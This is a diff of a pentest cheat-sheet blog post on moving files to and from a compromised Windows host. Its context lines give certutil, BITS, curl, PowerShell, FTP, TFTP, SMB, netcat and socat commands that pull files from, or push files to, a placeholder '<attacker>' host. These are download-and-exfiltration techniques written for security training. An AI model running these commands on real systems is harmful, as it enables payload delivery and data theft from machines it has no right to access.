@@ -1,18 +1,18 @@
 ---
 layout: post
 title: Windows File Transfers
-category: Pentest
+categories: [Pentest, CheatSheets]
 date: 2023-10-24 10:25 +0300
 ---
 
 
-# Introduction
+## Introduction
 
 
 Hi! In this post I want to explore Windows File Transfers. There's several ways to transfer files from our attacking machine to the Windows target, and from the Windows target to our attacking machine. 
 
 
-## The LOLBAS Project
+### The LOLBAS Project
 
 
 There is a GitHub repository [Living Off The Land Binaries, Scripts and Libraries](https://github.com/LOLBAS-Project/LOLBAS). The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques. It means that these tools can be used for many purposes, like File Transfers in our current topic. 
@@ -29,7 +29,7 @@ A LOLBin/Lib/Script must:
 ![LOLBAS Project](/assets/pentest/windows-file-transfers/lolbas.png)
 
 
-## List of Definitions
+### List of Definitions
 
 
 Several specific aliases are used in these examples, like `<base64>`. The list of definitions is provided below:
@@ -47,13 +47,13 @@ Several specific aliases are used in these examples, like `<base64>`. The list o
 Also, in this post and the examples I suppose that your attacking machine is a Debian-based Linux distribution, like Kali-Linux. In other distributions/operating systems these examples might not work or explicit configurations are required for them.
 
 
-# Base64
+## Base64
 
 
 One of the simpliest ways to transfer files is to use encodings. The `Base64` encoding can only produce symbols, which can be copied and pasted like a text strings and then used to decode the real file.
 
 
-## Base64 Command
+### Base64 Command
 
 
 Encode files to Base64:
@@ -69,7 +69,7 @@ echo <base64> | base64 -d -w 0 > <dest-path>
 ```
 
 
-## PowerShell Base64
+### PowerShell Base64
 
 
 PowerShell includes a `ToBase64String` method to convert bytes to base64. It can be combined with `Get-Content` cmdlet to convert file to Base64: 
@@ -94,7 +94,7 @@ $data = Get-Content -Raw "<filename>"
 ```
 
 
-## Certutil Base64
+### Certutil Base64
 
 
 Windows certutil has options to encode and decode files with Base64. The tool is native in Windows and we can execute it to transfer files.
@@ -114,13 +114,13 @@ certutil -decode <source-path> <dest-path>
 ![Certutil Base64 encode and decode](/assets/pentest/windows-file-transfers/base64_certutil.png)
 
 
-# HTTP
+## HTTP
 
 
 HTTP is everywhere now and it is difficult to blue teams to block the HTTP/HTTPS traffic to ports 80 and 443, because everyone is using browsers and web applications. 
 
 
-## Setup HTTP
+### Setup HTTP
 
 
 We have many options to setup a webserver on our attacking machine and each option has several variations. So, feel free to find and choose the right one for you. I'll provide several simple Python webservers here:
@@ -183,7 +183,7 @@ if __name__ == "__main__":
 ```
 
 
-## PowerShell HTTP
+### PowerShell HTTP
 
 
 PowerShell includes several ways to download files from HTTP servers. We can use an `Invoke-Webrequest` cmdlet and a `Webclient`:
@@ -243,7 +243,7 @@ Invoke-RestMethod -Uri "http://<attacker>/<filename>" -Method PUT -Body $body
 ```
 
 
-## certutil HTTP
+### certutil HTTP
 
 
 The purpose of the certutil was originally for certificate and CA management, but can also be used for downloading files from HTTP servers. The `-f` option is used to force overwriting files.  
@@ -253,7 +253,7 @@ certutil -urlcache -f http://<attacker>/<filename> <destination-path>
 ```
 
 
-## bitsadmin HTTP
+### bitsadmin HTTP
 
 
 The Background Intelligent Transfer Service (BITS) can download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user’s foreground work.
@@ -273,7 +273,7 @@ Start-BitsTransfer "<source-path>" -Destination "http://<attacker>/<filename>" -
 ```
 
 
-## curl HTTP
+### curl HTTP
 
 The `curl` utility is now included in Windows Command Prompt and can be used to download and upload files:
 
@@ -285,7 +285,7 @@ curl -X POST http://<attacker>/upload -F 'files=@<filename>'
 It has a collisium with PowerShell's alias for Invoke-Webrequest, so you can use it in cmd.exe only.
 
 
-## VBScript HTTP
+### VBScript HTTP
 
 
 Windows systems supports VBScripts and we can use it in our purposes. This method can work with old systems like XP and 2003.
@@ -325,7 +325,7 @@ cscript wget.vbs <http://<attacker>/<filename> > <dest-path>
 ```
 
 
-## IIS Server HTTP
+### IIS Server HTTP
 
 
 If the target Windows host has a running web server, why not to use it to transfer files from the victim machine? Just copy the files to the root of the web application, download them and remember to delete the artifacts.
@@ -335,13 +335,13 @@ copy <source-path> C:\inetpub\wwwroot\
 ```
 
 
-# SMB
+## SMB
 
 
 The Server Message Block protocol (SMB protocol) is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. SMB is used in all Windows systems and is enabled by default.
 
 
-## Setup SMB
+### Setup SMB
 
 
 To setup a SMB server on our attacking machine we can use [Impacket's smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py). Impacket is included in Kali Linux by default. We have to specify our share name (share in these examples).
@@ -365,7 +365,7 @@ sudo smbclient -L 127.0.0.1
 ```
 
 
-## Windows SMB
+### Windows SMB
 
 
 We have to connect to the share to work with SMB. In Windows systems, we can work with SMB in two ways. First, we can just input the path of the share and access it individually each time. In second, we can mount a SMB share as a drive and use it like a drive in our file system.
@@ -400,7 +400,7 @@ net share pentest /delete
 ```
 
 
-## PowerShell SMB
+### PowerShell SMB
 
 
 We can mount a SMB share with PowerShell's `New-PSDrive` cmdlet. Then the share can be accessed by using the drive letter:
@@ -413,13 +413,13 @@ cd Z:
 ```
 
 
-# FTP
+## FTP
 
 
 We can use the FTP service to transfer files between systems. FTP is installed on modern Windows systems and is enabled in Command Prompt.
 
 
-## Setup FTP
+### Setup FTP
 
 
 We can install a Python FTP server with `pyftpdlib` pip package.
@@ -435,7 +435,7 @@ python3 -m pyftpdlib -w
 ```
 
 
-## Windows FTP
+### Windows FTP
 
 
 We can use `ftp` command in interactive way. Use `help` command to list available commands.
@@ -459,7 +459,7 @@ ftp -v -n -s:file.txt
 ```
 
 
-## PowerShell FTP
+### PowerShell FTP
 
 
 Windows PowerShell can be used to communicate with FTP server. It can be done via PowerShell's `WebClient`.
@@ -472,7 +472,7 @@ $client.UploadFile("ftp://<attacker>:<port>/<filename>","<source-path>")
 ```
 
 
-# TFTP
+## TFTP
 
 
 TFTP can be used to transfer files to/from older Windows OS.
@@ -481,7 +481,7 @@ By default installed on: Up to Windows XP and 2003.
 By default not installed on: Windows 7, Windows 2008, and newer.
 
 
-## Setup TFTP
+### Setup TFTP
 
 
 Setup a atftpd TFTP Server. You can download and upload data with it.
@@ -494,7 +494,7 @@ atftpd --daemon --port 69 /tftp
 ```
 
 
-## Windows TFTP
+### Windows TFTP
 
 
 TFTP can be enabled with PowerShell on Windows (Administrator privileges are required).
@@ -513,13 +513,13 @@ tftp -i <attacker> PUT <filename>
 ```
 
 
-# Other Tools
+## Other Tools
 
 
 If anyhow you get these tools to the target machine, you can use them. You can find links to the static binaries for each tool there.
 
 
-## Netcat
+### Netcat
 
 
 [Netcat for windows 32/64 bit](https://github.com/int0x33/nc.exe/)
@@ -537,7 +537,7 @@ nc -nv <attacker/victim> <port> < <source-path>
 ```
 
 
-## Socat
+### Socat
 
 
 [Socat static binaries](https://github.com/3ndG4me/socat/releases)
@@ -555,7 +555,7 @@ socat TCP4:<attacker/victim>:<port> file:<source-path>,create
 ```
 
 
-# Conclusion
+## Conclusion
 
 
 In this post we explored the ways to transfer files between attacking and victim machines. These examples are not the complete list of possible File Transfers methods and I hope to update this post later. Feel free to share more information about the topic in the comments :).
